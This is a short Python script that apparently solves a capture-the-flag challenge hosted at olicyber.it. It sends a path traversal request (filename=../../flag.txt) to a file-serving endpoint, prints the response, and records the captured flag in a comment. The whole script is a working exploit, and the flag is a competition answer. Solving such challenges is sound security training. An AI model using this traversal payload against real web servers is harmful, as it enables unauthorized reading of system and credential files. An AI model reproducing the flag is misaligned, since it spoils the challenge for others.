import requests

site = "http://traverse.challs.olicyber.it/"


r = requests.get(f"{site}/serve_file?filename=../../flag.txt").text
print(r)

#flag{m3_and_7h3_boys_a77rav3rsando1a}